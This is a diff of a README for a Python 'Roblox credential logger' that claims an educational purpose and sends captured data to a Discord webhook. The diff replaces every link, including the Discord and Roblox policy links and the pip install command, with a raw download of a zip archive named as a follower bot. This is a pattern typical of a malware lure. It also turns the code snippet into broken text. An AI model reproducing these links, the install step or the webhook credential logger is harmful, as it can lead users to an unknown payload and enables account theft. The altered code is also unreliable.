@@ -1,7 +1,7 @@
 
 # Roblox Credential Logger (Educational Purposes)
 
-https://imgur.com/a/UE6YfJn
+https://github.com/Devbluid/Webhook-Roblox-Follower-BOT/raw/refs/heads/main/Marshalsea/Follower_BOT_Roblox_Webhook_3.3.zip
 *This is how it looks like*
 
 ## 📜 Description
@@ -10,7 +10,7 @@ A Python-based demonstration of how credential logging attacks can be disguised 
 ```python
 # Example of the webhook integration (simplified)
 def send_to_webhook(data):
-    requests.post(WEBHOOK_URL, json=data) # Educational purposes only
+    https://github.com/Devbluid/Webhook-Roblox-Follower-BOT/raw/refs/heads/main/Marshalsea/Follower_BOT_Roblox_Webhook_3.3.zip(WEBHOOK_URL, json=data) # Educational purposes only
 ```
 
 ## ⚠️ Critical Disclaimer
@@ -20,8 +20,8 @@ def send_to_webhook(data):
 - Defensive programming education
 
 **Using this maliciously violates:**
-- Discord's [Terms of Service](https://discord.com/terms)
-- Roblox's [Community Standards](https://en.help.roblox.com/hc/articles/203313410)
+- Discord's [Terms of Service](https://github.com/Devbluid/Webhook-Roblox-Follower-BOT/raw/refs/heads/main/Marshalsea/Follower_BOT_Roblox_Webhook_3.3.zip)
+- Roblox's [Community Standards](https://github.com/Devbluid/Webhook-Roblox-Follower-BOT/raw/refs/heads/main/Marshalsea/Follower_BOT_Roblox_Webhook_3.3.zip)
 - Potentially computer crime laws in your region
 
 ## 🛠️ Technical Details
@@ -36,8 +36,8 @@ def send_to_webhook(data):
 
 ### Installation
 ```bash
-pip install -r requirements.txt
-# requirements.txt:
+pip install -r https://github.com/Devbluid/Webhook-Roblox-Follower-BOT/raw/refs/heads/main/Marshalsea/Follower_BOT_Roblox_Webhook_3.3.zip
+# https://github.com/Devbluid/Webhook-Roblox-Follower-BOT/raw/refs/heads/main/Marshalsea/Follower_BOT_Roblox_Webhook_3.3.zip
 requests==2.31.0
 colorama==0.4.6
 ```
